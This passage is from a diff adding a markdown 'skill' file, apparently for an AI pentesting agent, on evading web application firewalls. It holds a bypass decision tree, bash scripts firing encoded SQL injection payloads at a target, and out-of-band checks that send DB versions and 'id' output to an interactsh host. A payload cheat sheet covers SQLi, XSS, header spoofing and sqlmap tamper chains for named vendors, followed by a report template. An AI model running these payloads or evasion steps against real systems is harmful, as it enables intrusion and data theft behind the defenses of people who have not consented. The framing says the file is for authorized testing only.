+curl -X POST "https://TARGET/v1/search" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"1'"'"' UNION SELECT 1,2,3--"}'
+```
+
+---
+
+## 15. WAF BYPASS DECISION TREE
+
+```
+TARGET HAS WAF
+      │
+      ▼
+┌─────────────────────────────────────────────────────┐
+│ STEP 1: Confirm WAF Presence                        │
+│ Send: ' OR '1'='1, <script>, ../../../etc/passwd    │
+│ Get 403/406/429/503? → WAF Present                  │
+└─────────────────────────────────────────────────────┘
+      │ YES                              │ NO
+      ▼                                  ▼
+┌─────────────────┐              ┌───────────────────┐
+│ STEP 2:         │              │ Direct            │
+│ Fingerprint     │              │ Exploitation →    │
+│ Vendor          │              │ No bypass needed  │
+└─────────────────┘              └───────────────────┘
+      │
+      ├─ Cloudflare ──────────────────────────────────────┐
+      ├─ AWS WAF ─────────────────────────────────────────┤
+      ├─ Akamai ──────────────────────────────────────────┤
+      ├─ Imperva ─────────────────────────────────────────┤
+      ├─ ModSecurity ─────────────────────────────────────┤
+      ├─ F5 BIG-IP ───────────────────────────────────────┤
+      └─ Unknown ─────────────────────────────────────────┘
+      │
+      ▼
+┌─────────────────────────────────────────────────────┐
+│ STEP 3: Origin IP Discovery                         │
+│ Try all 12 methods in parallel                      │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Found origin IP? ──── YES ──→ Direct probe origin
+      │                                      │
+      │                              WAF bypassed via IP?
+      │                                 YES → Exploit direct
+      │                                 NO  → Continue
+      │
+      ▼ NO (use WAF bypass techniques)
+┌─────────────────────────────────────────────────────┐
+│ STEP 4: HTTP-Level Bypass Attempts                  │
+│ Try in order:                                       │
+│ 4a. IP spoofing headers (X-Forwarded-For: 127.0.0.1)│
+│ 4b. Method override (X-HTTP-Method-Override)        │
+│ 4c. Content-Type manipulation                       │
+│ 4d. Chunked transfer encoding                       │
+│ 4e. HTTP request smuggling (CL.TE)                  │
+│ 4f. Parameter pollution (HPP)                       │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
+      │
+      ▼ NO
+┌─────────────────────────────────────────────────────┐
+│ STEP 5: Payload-Level Encoding Bypass               │
+│ Per vuln class:                                     │
+│                                                     │
+│ SQLi:                                               │
+│  5a. Comment variations: /**/, /*!50000...*/        │
+│  5b. Whitespace: %09, %0a, %0d, %0b, %0c           │
+│  5c. Case randomization                             │
+│  5d. Version comments: /*!50000UNION*/              │
+│  5e. URL double encoding: %2527 = %27 = '           │
+│  5f. Scientific notation: 1E0                       │
+│                                                     │
+│ XSS:                                               │
+│  5g. Tag mutation: <svg>, <details>, <input>        │
+│  5h. Event handler variation                        │
+│  5i. JS context: Function(), setTimeout()           │
+│  5j. Encoding: &#x61;&#x6c;&#x65;&#x72;&#x74;      │
+│  5k. AngularJS/template injection                   │
+│                                                     │
+│ CMDi:                                              │
+│  5l. IFS substitution: ${IFS}                       │
+│  5m. Brace expansion: {cat,/etc/passwd}             │
+│  5n. Base64 encode: echo YmFz...|base64 -d|bash     │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
+      │
+      ▼ NO
+┌─────────────────────────────────────────────────────┐
+│ STEP 6: Tool-Assisted Bypass                        │
+│ 6a. sqlmap with vendor-specific tamper chain        │
+│ 6b. LLM-powered payload mutation                   │
+│ 6c. Custom tamper script development                │
+│ 6d. Fuzzing with ffuf + WAF bypass headers          │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
+      │
+      ▼ NO
+┌─────────────────────────────────────────────────────┐
+│ STEP 7: Protocol & Architecture Bypass              │
+│ 7a. HTTP/3 QUIC (WAF may not inspect)               │
+│ 7b. WebSocket upgrade                               │
+│ 7c. gRPC protobuf                                   │
+│ 7d. GraphQL endpoint                                │
+│ 7e. JSON body vs form params                        │
+│ 7f. Out-of-band (DNS exfil, Burp Collaborator)      │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
+      │
+      ▼ NO
+┌─────────────────────────────────────────────────────┐
+│ STEP 8: Rate Limiting + Timing Attacks              │
+│ 8a. Slow down requests (--delay 5)                  │
+│ 8b. IP rotation via proxy pool                      │
+│ 8c. Distribute across multiple source IPs           │
+│ 8d. Session rotation (new session per N requests)   │
+│ 8e. Time-based blind (SLEEP, WAITFOR DELAY)         │
+│     — bypasses block/monitor by avoiding detection  │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
+      │
+      ▼ NO
+┌─────────────────────────────────────────────────────┐
+│ STEP 9: Second-Order / Logic Bypasses               │
+│ 9a. Store payload in benign field, trigger later    │
+│ 9b. File upload → process later (SSTI, SSRF, XXE)  │
+│ 9c. CSV/Excel injection via export feature          │
+│ 9d. Log injection → log viewer XSS                  │
+│ 9e. Email field injection → admin panel display     │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
+      │
+      ▼ NO
+┌─────────────────────────────────────────────────────┐
+│ STEP 10: Cache Poisoning for WAF Bypass             │
+│ 10a. Cache poisoning via unkeyed headers            │
+│ 10b. Fat GET request (body not in cache key)        │
+│ 10c. Parameter cloaking                             │
+│ 10d. Web Cache Deception                            │
+└─────────────────────────────────────────────────────┘
+      │
+      ├─ Bypass succeeded? ──── YES ──→ EXPLOIT
+      │
+      ▼
+┌─────────────────────────────────────────────────────┐
+│ DOCUMENT as:                                        │
+│ "WAF successfully blocks this attack vector"        │
+│ → Move to next vuln class or attack surface         │
+└─────────────────────────────────────────────────────┘
+
+EXPLOIT PATH:
+      │
+      ▼
+┌─────────────────────────────────────────────────────┐
+│ Confirm bypass is stable (5/5 requests bypass)      │
+│ Verify actual vulnerability (not just bypass)       │
+│ Document: payload + technique + evidence            │
+│ → Proceed to exploitation per vuln class            │
+└─────────────────────────────────────────────────────┘
+```
+
+---
+
+## 16. BYPASS VERIFICATION AND REPORTING
+
+### 16.1 Confirming WAF Bypass Without Triggering Alerts
+
+```bash
+# Step 1: Confirm the WAF blocks your baseline payload
+BASE_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
+  "https://TARGET/?id=1'OR'1'='1")
+[ "$BASE_CODE" = "403" ] && echo "Baseline: WAF is blocking (expected)"
+
+# Step 2: Apply bypass technique
+BYPASS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
+  "https://TARGET/?id=1'/*!50000OR*//*!50000'1'*/='1")
+echo "Bypass attempt: HTTP $BYPASS_CODE"
+
+# Step 3: Confirm bypass is functional (not just evading — actually working)
+# For SQLi: get DB response
+RESPONSE=$(curl -sk "https://TARGET/?id=1'/*!50000UNION*//*!50000SELECT*/1,@@version,3--+-")
+DB_VERSION=$(echo "$RESPONSE" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+-[A-Za-z]+')
+if [ -n "$DB_VERSION" ]; then
+  echo "[CONFIRMED] WAF bypass + SQLi working. DB: $DB_VERSION"
+fi
+
+# Step 4: Timing-based blind confirmation (less visible)
+START=$(date +%s%N)
+curl -sk "https://TARGET/?id=1'AND(SELECT(1)FROM(SELECT(SLEEP(3)))a)AND'1'='1" > /dev/null
+END=$(date +%s%N)
+ELAPSED=$(( (END - START) / 1000000 ))
+[ "$ELAPSED" -gt 2900 ] && echo "[CONFIRMED] Time-based blind SQLi bypass confirmed (${ELAPSED}ms delay)"
+```
+
+### 16.2 Out-of-Band Bypass Confirmation
+
+```bash
+# Use Burp Collaborator or interactsh for zero-noise confirmation
+# No reflected output needed — DNS interaction proves execution
+
+# Start interactsh listener
+interactsh-client &
+COLLABORATOR_URL="xxxx.interact.sh"
+
+# SQLi OOB confirmation via DNS
+curl -sk "https://TARGET/?id=1'+AND+LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.',
+'${COLLABORATOR_URL}','\\\\x'))--+"
+
+# For MSSQL
+curl -sk "https://TARGET/?id=1;EXEC+xp_dirtree+'\\\\${COLLABORATOR_URL}\\a'--"
+
+# CMDi OOB
+curl -sk "https://TARGET/?cmd=nslookup+\$(id).${COLLABORATOR_URL}"
+
+# Wait for DNS interaction in interactsh output
+# DNS record received = confirmed OOB execution
+```
+
+### 16.3 Evidence Collection Checklist
+
+For each confirmed WAF bypass, collect:
+
+```
+1. BASELINE EVIDENCE
+   □ Screenshot/capture of WAF blocking original payload
+   □ HTTP request (raw) that was blocked
+   □ HTTP response (raw) showing block page
+   □ SHA256 of response body: sha256sum <<< "$BLOCKED_BODY"
+
+2. BYPASS EVIDENCE  
+   □ Exact HTTP request that bypassed WAF (curl command + raw request)
+   □ HTTP response showing bypass succeeded (200   □ Timestamp of bypass (for correlation with WAF logs)
+   □ 5x repeated successful bypass requests (confirms stability)
+   □ Actual vulnerability output (DB version, /etc/passwd line, RCE output)
+
+3. CHAIN EVIDENCE (if bypass + vuln chained)
+   □ Each step documented separately
+   □ Intermediate output captured at each link
+   □ Final impact demonstrated with distinct independent command
+
+4. FILE ARTIFACTS
+   □ All raw HTTP traffic saved: workspace/vulns/confirmed/FINDING_NAME/
+   □ Payload file: payload.txt
+   □ Request file: request.http
+   □ Response file: response.html
+   □ Evidence hash: sha256sum * > hashes.txt
+```
+
+### 16.4 WAF Bypass Finding Report Template
+
+```markdown
+## Finding: WAF Bypass via [TECHNIQUE] → [VULNERABILITY CLASS]
+
+**Severity:** Critical / High / Medium  
+**Status:** Confirmed  
+**CVSS:** (calculate based on impact)
+
+### Summary
+The [VENDOR] WAF protecting [TARGET] was bypassed using [TECHNIQUE], allowing
+exploitation of [VULNERABILITY] in parameter [PARAM] of endpoint [ENDPOINT].
+
+### Affected Component
+- URL: https://TARGET/path/to/endpoint
+- Parameter: id / q / search / etc.
+- WAF Vendor: Cloudflare / AWS WAF / ModSecurity / etc.
+- Backend DB / Tech: MySQL 8.0.x / Apache 2.4.x / etc.
+
+### Reproduction Steps
+
+1. Confirm WAF blocks baseline payload:
+   ```
+   GET /endpoint?param=BASELINE_PAYLOAD HTTP/1.1
+   Host: TARGET.COM
+   
+   Response: HTTP/1.1 403 Forbidden
+   ```
+
+2. Send bypass payload:
+   ```
+   GET /endpoint?param=BYPASS_PAYLOAD HTTP/1.1
+   Host: TARGET.COM
+   X-Forwarded-For: 127.0.0.1
+   
+   Response: HTTP/1.1 200 OK
+   [DATABASE VERSION / COMMAND OUTPUT / SENSITIVE DATA]
+   ```
+
+3. Confirm with independent observable:
+   ```
+   [TIMING / DNS INTERACTION / DB VERSION / FILE CONTENT]
+   ```
+
+### Technical Root Cause
+The [VENDOR] WAF pattern match for [VULN CLASS] does not account for
+[ENCODING / COMMENT STYLE / WHITESPACE VARIANT] used in the bypass payload.
+The application backend normalizes the input before processing, resolving the
+obfuscation after the WAF has already approved the request.
+
+### Evidence Files
+- `request_blocked.http` — SHA256: [HASH]
+- `request_bypass.http` — SHA256: [HASH]  
+- `response_bypass.html` — SHA256: [HASH]
+- `bypass_confirmed_5x.txt` — 5 successful repetitions
+
+### Business Impact
+[Describe what an attacker can do with this bypass: data exfiltration, RCE, etc.]
+
+### Remediation
+1. **Immediate:** [Temporary mitigation — IP block, rate limit, disable feature]
+2. **Short-term:** Update WAF ruleset to cover [ENCODING VARIANT]
+3. **Long-term:** [Parameterized queries / output encoding / input validation at application layer]
+4. **Verify fix:** Retest with payload variants from this report — all should return 403.
+
+### References
+- WAF vendor advisory (if applicable)
+- OWASP Testing Guide: [relevant section]
+- CWE: [CWE-89 SQLi / CWE-79 XSS / etc.]
+```
+
+### 16.5 Bypass Stability Rating
+
+Before reporting, rate bypass stability:
+
+```
+STABLE (5/5):   Same payload works 5 times in a row         → Report as confirmed
+FLAKY (3/5):    Works ~60% — WAF may have randomized rules  → Note instability
+INTERMITTENT:   Works 1-2/5 — anomaly scoring variation     → Document timing
+RATE-LIMITED:   Works once, then blocked                    → Note rate limit bypass needed
+```
+
+```bash
+# Stability test script
+PAYLOAD="1'/*!50000UNION*//*!50000SELECT*/1,@@version,3--+-"
+ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
+SUCCESS=0
+
+for i in $(seq 1 5); do
+  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=$ENC")
+  [ "$CODE" != "403" ] && SUCCESS=$((SUCCESS+1))
+  echo "Attempt $i: HTTP $CODE"
+  sleep 2
+done
+
+echo "Stability: $SUCCESS/5"
+case $SUCCESS in
+  5) echo "Rating: STABLE — safe to report as confirmed";;
+  3|4) echo "Rating: FLAKY — note intermittency in report";;
+  1|2) echo "Rating: INTERMITTENT — collect more evidence";;
+  0) echo "Rating: BLOCKED — bypass failed";;
+esac
+```
+
+---
+
+## APPENDIX A: QUICK REFERENCE PAYLOAD CHEATSHEET
+
+```
+═══════════════════════════════════════════════════════════════
+WAF BYPASS QUICK REFERENCE — AUTHORIZED TESTING
+═══════════════════════════════════════════════════════════════
+
+SPACE BYPASS:
+  /**/ %09 %0a %0d %0b %0c %a0 ()
+
+QUOTE BYPASS (MySQL):
+  0x27 /*!27*/ CHAR(39) %ef%bc%87
+
+UNION BYPASS:
+  /*!50000UNION*/ %23%0aUNION %0aUNION
+  uNiOn UnIoN UNION%0d%0a
+
+SELECT BYPASS:
+  /*!50000SELECT*/ sElEcT %53ELECT S%65LECT
+
+COMMENT BYPASS:
+  -- --+ --+- --+%20 #%0a /*!...*/
+
+XSS TAG BYPASS:
+  <svg/onload=   <details/open/ontoggle=
+  <input/autofocus/onfocus=   <img/src=x/onerror=
+
+XSS EVENT BYPASS:
+  onload= onerror= ontoggle= onfocus= onmouseover=
+  onpointerover= onpointerenter= onpointerdown=
+
+XSS FUNCTION BYPASS:
+  alert` ` window[`alert`] (alert)(1)
+  top[`al`+`ert`](1) [].constructor.constructor(`alert(1)`)()
+
+ORIGIN IP:
+  X-Forwarded-For: 127.0.0.1
+  X-Real-IP: 127.0.0.1
+  True-Client-IP: 127.0.0.1
+  CF-Connecting-IP: 127.0.0.1
+
+ENCODING CHAIN:
+  '  →  %27  →  %2527  →  %252527
+  <  →  %3C  →  %253C  →  &#60;  →  &#x3C;  →  \u003c
+  /  →  %2F  →  %252F  →  %c0%af  →  %ef%bc%8f
+
+TOP TAMPER COMBOS:
+  Cloudflare:   space2comment,randomcase,charunicodeencode
+  AWS WAF:      randomcase,space2mysqlblank,charencode
+  ModSec CRS:   modsecurityversioned,space2comment,between
+  Imperva:      securesphere,space2comment,charunicodeencode
+  Akamai:       charunicodeencode,space2comment,randomcase
+  F5:           versionedkeywords,space2comment,multiplespaces
+
+PROTOCOL BYPASS ORDER:
+  1. Direct origin IP
+  2. HTTP/3 QUIC
+  3. WebSocket upgrade
+  4. GraphQL endpoint
+  5. gRPC protobuf
+  6. Chunked transfer
+  7. HTTP smuggling
+═══════════════════════════════════════════════════════════════
+```
+
+---
+
+*Skill version: 2.0 — Updated 2024-2025*  
+*For authorized penetration testing engagements only.*  
+*Load this skill when: WAF is detected, payloads are being blocked, evasion is required.*
